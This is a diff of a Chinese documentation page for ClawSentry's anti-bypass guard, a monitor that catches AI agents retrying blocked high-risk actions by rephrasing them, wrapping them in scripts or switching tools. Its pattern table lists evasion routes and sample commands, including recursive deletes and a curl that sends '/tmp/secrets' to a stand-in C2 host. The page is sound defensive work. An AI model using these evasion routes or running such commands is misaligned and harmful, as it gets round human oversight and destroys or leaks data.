@@ -6,7 +6,7 @@
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
-        <meta name="description" content="默认关闭的前置反绕过保护层 — 用紧凑指纹记住高风险最终判决，识别重复、变形和跨工具绕过尝试">
+        <meta name="description" content="默认关闭的预动作层，在会话内存储高风险最终决策的紧凑指纹，并检测同一会话中的重复、改写和跨工具重试尝试。">
       
       
       
@@ -27,7 +27,7 @@
     
     
       
-        <title>Anti-bypass Follow-up Guard - ClawSentry</title>
+        <title>旁路跟踪防护 - ClawSentry</title>
       
     
     
@@ -80,7 +80,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#anti-bypass-follow-up-guard" class="md-skip">
+        <a href="#_1" class="md-skip">
           跳转至
         </a>
       
@@ -114,7 +114,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Anti-bypass Follow-up Guard
+              旁路跟踪防护
             
           </span>
         </div>
@@ -170,6 +170,11 @@
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
       </label>
       <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
         
         <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
           
@@ -252,6 +257,8 @@
           
   
   
+    
+  
   入门指南
 
         </a>
@@ -272,6 +279,8 @@
           
   
   
+    
+  
   集成接入
 
         </a>
@@ -291,6 +300,8 @@
         <a href="../../configuration/configuration-overview/" class="md-tabs__link">
           
   
+  
+    
   
   配置参考
 
@@ -331,6 +342,8 @@
           
   
   
+    
+  
   API 文档
 
         </a>
@@ -352,6 +365,8 @@
         <a href="../l1-rules/" class="md-tabs__link">
           
   
+  
+    
   
   安全决策引擎
 
@@ -388,9 +403,11 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../advanced/rule-governance/" class="md-tabs__link">
+        <a href="../../advanced/skill-trust/" class="md-tabs__link">
           
   
+  
+    
   
   高级用法
 
@@ -411,6 +428,8 @@
         <a href="../../operations/deployment/" class="md-tabs__link">
           
   
+  
+    
   
   部署运维
 
@@ -518,6 +537,16 @@
   
   
     
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
     
     
     
@@ -691,6 +720,22 @@
   
   
     
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
     
     
     
@@ -948,6 +993,22 @@
   
   
     
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
     
     
     
@@ -1232,6 +1293,26 @@
   
   
     
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
     
     
     
@@ -1548,6 +1629,24 @@
   
     
     
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
     
     
       
@@ -1742,34 +1841,6 @@
   
   
     <li class="md-nav__item">
-      <a href="../sanitizer-capability/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Sanitizer 当前能力
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
       <a href="../scope-restrictions/" class="md-nav__link">
         
   
@@ -1886,10 +1957,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
+  <a href="#_2" class="md-nav__link">
     <span class="md-ellipsis">
       
-        识别“换个说法再试一次”的高风险操作
+        拦截一次，持续监视"换个方式再试"
       
     </span>
   </a>
@@ -1897,44 +1968,33 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#when-to-use" class="md-nav__link">
+  <a href="#pattern-categories" class="md-nav__link">
     <span class="md-ellipsis">
       
-        适用场景
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="适用场景">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        重复提交同一危险命令
+        旁路模式类型
       
     </span>
   </a>
   
 </li>
+      
+        <li class="md-nav__item">
+  <a href="#intent-classification" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        破坏性意图分类
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="破坏性意图分类">
+      <ul class="md-nav__list">
         
           <li class="md-nav__item">
   <a href="#_3" class="md-nav__link">
     <span class="md-ellipsis">
       
-        改写命令但意图相同
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        跨工具或脚本包装绕过
+        意图标签与操作类别
       
     </span>
   </a>
@@ -1943,6 +2003,78 @@
         
       </ul>
     </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detection-pipeline" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        检测管道
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#memory-storage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        内存存储
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="内存存储">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        触发写入的条件
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        存储内容（不含原始内容）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        内存边界
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#output-format" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        输出格式
+      
+    </span>
+  </a>
   
 </li>
       
@@ -1950,60 +2082,10 @@
   <a href="#pipeline-position" class="md-nav__link">
     <span class="md-ellipsis">
       
-        它在决策链路里的位置
+        在管道中的位置
       
     </span>
   </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#how-it-works" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        工作原理
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="工作原理">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#memory-write" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        1. 什么时候写入记忆？
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#fingerprints" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        2. 记住哪些指纹？
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#match-types" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        3. 如何匹配 follow-up？
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -2011,46 +2093,7 @@
   <a href="#actions" class="md-nav__link">
     <span class="md-ellipsis">
       
-        决策动作怎么理解？
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="决策动作怎么理解？">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#guard" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        没有 Guard 时
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#guard_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        启用 Guard 后
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#quickstart" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        快速启用
+        处置动作
       
     </span>
   </a>
@@ -2061,7 +2104,68 @@
   <a href="#configuration" class="md-nav__link">
     <span class="md-ellipsis">
       
-        配置速查
+        配置
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="配置">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        核心开关
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        内存范围
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        相似度阈值
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        快速上手示例
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#relationship" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        与其他决策层的关系
       
     </span>
   </a>
@@ -2072,18 +2176,7 @@
   <a href="#observability" class="md-nav__link">
     <span class="md-ellipsis">
       
-        可观测性与审计
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#relationship" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        与其他决策层的关系
+        可观测性
       
     </span>
   </a>
@@ -2105,7 +2198,7 @@
   <a href="#source-code" class="md-nav__link">
     <span class="md-ellipsis">
       
-        代码位置
+        源文件
       
     </span>
   </a>
@@ -2174,6 +2267,24 @@
   
     
     
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
     
     
       
@@ -2219,6 +2330,34 @@
 
           </label>
           <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../advanced/skill-trust/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Skill Trust / Registry
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
             
               
                 
@@ -2431,6 +2570,16 @@
   
     
     
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
     
     
       
@@ -2540,70 +2689,14 @@
   
   
     <li class="md-nav__item">
-      <a href="../../operations/docs-coverage-audit/" class="md-nav__link">
+      <a href="../../operations/release-progress/" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
     
   
-    文档覆盖审计
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../operations/docs-audit-2026-04-27/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    执行审计 2026-04-27
-  
-
-    
-  </span>
-  
-  
-
-      </a>
-    </li>
-  
-
-              
-            
-              
-                
-  
-  
-  
-  
-    <li class="md-nav__item">
-      <a href="../../operations/recent-feature-coverage/" class="md-nav__link">
-        
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    最近功能覆盖矩阵
+    发布进度
   
 
     
@@ -2706,10 +2799,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
+  <a href="#_2" class="md-nav__link">
     <span class="md-ellipsis">
       
-        识别“换个说法再试一次”的高风险操作
+        拦截一次，持续监视"换个方式再试"
       
     </span>
   </a>
@@ -2717,44 +2810,33 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#when-to-use" class="md-nav__link">
+  <a href="#pattern-categories" class="md-nav__link">
     <span class="md-ellipsis">
       
-        适用场景
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="适用场景">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        重复提交同一危险命令
+        旁路模式类型
       
     </span>
   </a>
   
 </li>
+      
+        <li class="md-nav__item">
+  <a href="#intent-classification" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        破坏性意图分类
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="破坏性意图分类">
+      <ul class="md-nav__list">
         
           <li class="md-nav__item">
   <a href="#_3" class="md-nav__link">
     <span class="md-ellipsis">
       
-        改写命令但意图相同
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#_4" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        跨工具或脚本包装绕过
+        意图标签与操作类别
       
     </span>
   </a>
@@ -2763,6 +2845,78 @@
         
       </ul>
     </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#detection-pipeline" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        检测管道
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#memory-storage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        内存存储
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="内存存储">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        触发写入的条件
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        存储内容（不含原始内容）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        内存边界
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#output-format" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        输出格式
+      
+    </span>
+  </a>
   
 </li>
       
@@ -2770,60 +2924,10 @@
   <a href="#pipeline-position" class="md-nav__link">
     <span class="md-ellipsis">
       
-        它在决策链路里的位置
+        在管道中的位置
       
     </span>
   </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#how-it-works" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        工作原理
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="工作原理">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#memory-write" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        1. 什么时候写入记忆？
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#fingerprints" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        2. 记住哪些指纹？
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#match-types" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        3. 如何匹配 follow-up？
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -2831,46 +2935,7 @@
   <a href="#actions" class="md-nav__link">
     <span class="md-ellipsis">
       
-        决策动作怎么理解？
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="决策动作怎么理解？">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#guard" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        没有 Guard 时
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#guard_1" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        启用 Guard 后
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#quickstart" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        快速启用
+        处置动作
       
     </span>
   </a>
@@ -2881,7 +2946,68 @@
   <a href="#configuration" class="md-nav__link">
     <span class="md-ellipsis">
       
-        配置速查
+        配置
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="配置">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        核心开关
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        内存范围
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        相似度阈值
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        快速上手示例
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#relationship" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        与其他决策层的关系
       
     </span>
   </a>
@@ -2892,18 +3018,7 @@
   <a href="#observability" class="md-nav__link">
     <span class="md-ellipsis">
       
-        可观测性与审计
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#relationship" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        与其他决策层的关系
+        可观测性
       
     </span>
   </a>
@@ -2925,7 +3040,7 @@
   <a href="#source-code" class="md-nav__link">
     <span class="md-ellipsis">
       
-        代码位置
+        源文件
       
     </span>
   </a>
@@ -2954,6 +3069,54 @@
           
             <div class="md-content" data-md-component="content">
               
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="导航栏" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    首页
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../l1-rules/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    安全决策引擎
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
               <article class="md-content__inner md-typeset">
                 
                   
@@ -2963,236 +3126,475 @@
   
 
 
-<h1 id="anti-bypass-follow-up-guard">Anti-bypass Follow-up Guard<a class="headerlink" href="#anti-bypass-follow-up-guard" title="Permanent link">&para;</a></h1>
+<h1 id="_1">旁路跟踪防护<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
 <div class="cs-doc-hero">
-<div class="cs-eyebrow">Decision Engine · v0.6.0 docs baseline</div>
-<h2 id="_1">识别“换个说法再试一次”的高风险操作<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<p>Anti-bypass Follow-up Guard 是 ClawSentry 的<strong>前置反绕过保护层</strong>。它默认关闭；启用后，会在同一 session 内记住已经做出最终高风险判决的操作指纹。当 Agent 随后把同一危险动作换成相似命令、脚本包装或另一个工具重试时，Guard 会把这次 follow-up 尝试标记出来，并按你的 rollout 策略观察、升级到 L2/L3、进入人工确认，或在精确重复时直接阻断。</p>
+<div class="cs-eyebrow">决策引擎 · 跟踪保护层</div>
+<h2 id="_2">拦截一次，持续监视"换个方式再试"<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>旁路跟踪防护（Anti-bypass Follow-up Guard）是 ClawSentry 的<strong>会话级跟踪检测层</strong>，默认关闭。启用后，网关会为历史高风险最终决策存储紧凑指纹。当智能体以改写措辞、包装成脚本或通过不同工具重新提交类似危险动作时，该防护层会在正常策略评估之前识别该跟踪行为，并应用配置的处置动作。</p>
 <div class="cs-pill-row">
 <p><span class="cs-pill">默认关闭</span>
-<span class="cs-pill">仅 PRE_ACTION</span>
-<span class="cs-pill">Final decision memory</span>
-<span class="cs-pill">不保存 raw command</span>
-<span class="cs-pill">Cross-tool 不本地 hard-block</span></p>
+<span class="cs-pill">仅限 PRE_ACTION</span>
+<span class="cs-pill">会话级内存</span>
+<span class="cs-pill">仅存紧凑指纹</span>
+<span class="cs-pill">跨工具不可本地阻断</span></p>
 </div>
 </div>
 <div class="admonition tip">
-<p class="admonition-title">一句话理解</p>
-<p>L1/L2/L3 判断“这次操作危险吗”；Anti-bypass Guard 额外判断“这是不是刚刚被拦截/延后后，换个形式又试了一次”。</p>
+<p class="admonition-title">在管道中的角色</p>
+<p>L1/L2/L3 回答的是"当前动作现在是否危险？"。旁路防护（Anti-bypass Guard）回答的是"本会话是否已对等效动作产生过高风险最终决策？"。两者按顺序运行；防护层在正常策略之前触发，可强制将跟踪尝试升级到更高审查级别。</p>
 </div>
 <hr />
-<h2 id="when-to-use">适用场景<a class="headerlink" href="#when-to-use" title="Permanent link">&para;</a></h2>
-<div class="cs-card-grid">
-<div class="cs-card">
-<h3 id="_2">重复提交同一危险命令<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
-<p>第一次 <code>rm -rf /important</code> 已被 <code>block</code> 或 <code>defer</code>，Agent 立即用同一工具、同一 payload 再提交一次。Guard 可识别为 <code>exact_raw_repeat</code>。</p>
-</div>
-<div class="cs-card">
-<h3 id="_3">改写命令但意图相同<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
-<p>第一次是直接删除；第二次改成变量、别名或轻微格式变化，但归一化后仍是同一个破坏性动作。Guard 可识别为 <code>normalized_destructive_repeat</code>。</p>
-</div>
-<div class="cs-card">
-<h3 id="_4">跨工具或脚本包装绕过<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
-<p>第一次用 shell 被拦，第二次改成脚本、另一个工具或相似 feature 集合。Guard 可识别为 <code>cross_tool_script_similarity</code>，但不会本地 hard-block。</p>
-</div>
-</div>
-<hr />
-<h2 id="pipeline-position">它在决策链路里的位置<a class="headerlink" href="#pipeline-position" title="Permanent link">&para;</a></h2>
-<p>Anti-bypass Guard 只参与 <code>PRE_ACTION</code>。它位于 session 级强制策略之后、普通 policy 之前，因此不会绕过更高优先级的 quarantine / session enforcement，也不会在工具执行后才补救。</p>
-<pre class="mermaid"><code>flowchart LR
-    A[Agent PRE_ACTION] --&gt; Q[Quarantine / Session Enforcement]
-    Q --&gt; AB{Anti-bypass Guard\n已启用?}
-    AB --&gt;|未命中| L1[L1 / L2 / L3 normal policy]
-    AB --&gt;|observe / force_l2 / force_l3| L1
-    AB --&gt;|defer / block| D[产生 guarded decision]
-    L1 --&gt; T[Trajectory / benchmark finalization]
-    D --&gt; T
-    T --&gt; R[_record_decision_path]
-    R --&gt; M[Final-only compact memory update]</code></pre>
-<div class="cs-flow-strip">
-<p><strong>顺序保证：</strong> quarantine / session enforcement → anti-bypass guard → normal policy → trajectory / benchmark finalization → decision record → final-only memory update</p>
-</div>
-<hr />
-<h2 id="how-it-works">工作原理<a class="headerlink" href="#how-it-works" title="Permanent link">&para;</a></h2>
-<p>Guard 的核心是“<strong>只记住可比较的安全指纹，不记住敏感原文</strong>”。它不会保存 raw payload、raw command、secret、完整路径内容或 L3 trace；只保存 hashes、fingerprints、tool label、policy id、risk level、record id 与时间戳。</p>
-<h3 id="memory-write">1. 什么时候写入记忆？<a class="headerlink" href="#memory-write" title="Permanent link">&para;</a></h3>
-<p>一次事件只有满足以下条件才会进入 anti-bypass memory：</p>
-<ol>
-<li>Guard 已启用：<code>CS_ANTI_BYPASS_GUARD_ENABLED=true</code></li>
-<li>事件类型是 <code>PRE_ACTION</code></li>
-<li>判决是最终判决：<code>final=true</code></li>
-<li>判决属于可记忆 verdict：默认 <code>block,defer</code></li>
-<li>风险等级达到阈值：默认 <code>high</code> 或 <code>critical</code></li>
-<li>如果是 <code>allow</code>，必须显式开启 <code>CS_ANTI_BYPASS_RECORD_ALLOW_DECISIONS=true</code></li>
-</ol>
-<div class="admonition note">
-<p class="admonition-title">这里的 final 指什么？</p>
-<p>Guard 记录的是 Gateway 已生成并持久化的 final canonical decision（<code>decision.final=true</code>），写入发生在 <code>_record_decision_path</code> 之后。若该 final decision 是 <code>defer</code>，后续 operator / timeout resolution 可能再把审批结果解析为 allow/deny；当前 memory 不等待这个后续 resolution，也不会回溯删除已记录的 compact fingerprint。</p>
-</div>
-<h3 id="fingerprints">2. 记住哪些指纹？<a class="headerlink" href="#fingerprints" title="Permanent link">&para;</a></h3>
+<h2 id="pattern-categories">旁路模式类型<a class="headerlink" href="#pattern-categories" title="Permanent link">&para;</a></h2>
+<p>防护层识别五种匹配类型。每种类型有独立的检测方法和可通过配置覆盖的默认处置动作。</p>
 <table>
 <thead>
 <tr>
-<th>记忆字段</th>
-<th>用途</th>
-<th>是否含原文</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>raw_payload_hash</code></td>
-<td>判断同一工具、同一 canonical payload 是否原样重复</td>
-<td>否</td>
-</tr>
-<tr>
-<td><code>normalized_action_fingerprint</code></td>
-<td>判断格式变化后是否仍是同一破坏性动作</td>
-<td>否</td>
-</tr>
-<tr>
-<td><code>destructive_intent_fingerprint</code> / label</td>
-<td>判断删除、外传、提权、远程执行等意图类别</td>
-<td>否</td>
-</tr>
-<tr>
-<td><code>normalized_feature_hashes</code></td>
-<td>用 Jaccard similarity 判断跨工具/脚本相似度</td>
-<td>否</td>
-</tr>
-<tr>
-<td><code>prior_event_id</code> / <code>prior_record_id</code> / <code>policy_id</code></td>
-<td>让审计人员追溯 prior final decision</td>
-<td>否</td>
-</tr>
-</tbody>
-</table>
-<h3 id="match-types">3. 如何匹配 follow-up？<a class="headerlink" href="#match-types" title="Permanent link">&para;</a></h3>
-<table>
-<thead>
-<tr>
-<th>Match type</th>
-<th>典型含义</th>
+<th>匹配类型</th>
+<th>检测方法</th>
 <th>默认动作</th>
-<th>本地 BLOCK 权限</th>
+<th>允许本地 <code>block</code></th>
+<th>示例模式</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td><code>exact_raw_repeat</code></td>
-<td>同一 session、同一 tool、同一 raw payload hash</td>
+<td><code>{event_type, tool_name, canonical payload}</code> 的 SHA-256 与同工具历史记录匹配</td>
 <td><code>block</code></td>
-<td>可以</td>
+<td>是</td>
+<td><code>bash: rm -rf /tmp/build</code> 通过同一工具以完全相同的参数再次提交</td>
 </tr>
 <tr>
-<td><code>normalized_destructive_repeat</code></td>
-<td>同一 tool，归一化后是同一破坏性动作</td>
+<td><code>normalized_destructive_repeat</code>（精确）</td>
+<td>归一化动作文本哈希与历史记录相同；同工具；两者均有破坏性</td>
 <td><code>defer</code></td>
-<td>显式配置后可以</td>
+<td>是</td>
+<td><code>bash: rm  -rf  /tmp/build</code>（多余空格）出现在 <code>bash: rm -rf /tmp/build</code> 被阻断之后——归一化哈希相同</td>
+</tr>
+<tr>
+<td><code>normalized_destructive_repeat</code>（软匹配）</td>
+<td>同工具 token 哈希集合的 Jaccard 相似度 ≥ <code>CS_ANTI_BYPASS_SAME_TOOL_SIMILARITY_THRESHOLD</code>（默认 <code>0.88</code>）；两者均有破坏性</td>
+<td><code>defer</code></td>
+<td>是</td>
+<td><code>bash: rm -rf /tmp/build_cache</code> 出现在 <code>bash: rm -rf /tmp/build</code> 之后——token 哈希 Jaccard ≥ 0.88</td>
 </tr>
 <tr>
 <td><code>cross_tool_script_similarity</code></td>
-<td>换工具/脚本包装，但意图或 feature 集合相似</td>
+<td>不同工具；满足以下任一条件：归一化指纹精确匹配、操作+范围重叠、意图指纹匹配，或跨工具 Jaccard ≥ <code>CS_ANTI_BYPASS_SIMILARITY_THRESHOLD</code>（默认 <code>0.92</code>）</td>
 <td><code>force_l3</code></td>
-<td><strong>不可以</strong></td>
+<td>否——已校验为 <code>force_l3</code></td>
+<td><code>python: shutil.rmtree('/tmp/build')</code> 出现在 <code>bash: rm -rf /tmp/build</code> 被阻断之后——不同工具，相同的删除树意图和范围</td>
+</tr>
+<tr>
+<td><code>denied_effect_repeat</code></td>
+<td>能力类别 + 效果目标哈希或工件族与历史被阻断效果匹配</td>
+<td><code>block</code>（精确目标）/ <code>defer</code>（族匹配，普通/宽松模式）</td>
+<td>取决于效果匹配类型</td>
+<td><code>bash: curl https://c2.example.com -d @/tmp/secrets</code> 在对同一主机的先前 <code>curl</code> 被阻断后重新尝试（<code>network.fetch</code> 能力 + 目标哈希匹配）</td>
+</tr>
+<tr>
+<td><code>pending_effect_equivalent</code></td>
+<td>能力类别 + 效果目标哈希或工件族与当前挂起的 defer 效果匹配</td>
+<td><code>defer</code>（始终）</td>
+<td>否</td>
+<td><code>bash: rm -rf /prod/data</code> 在完全相同的先前动作仍处于等待运营者审核状态时再次提交（<code>command.exec</code> 能力 + 目标哈希匹配）</td>
 </tr>
 </tbody>
 </table>
 <div class="admonition warning">
-<p class="admonition-title">Cross-tool/script 永不本地 hard-block</p>
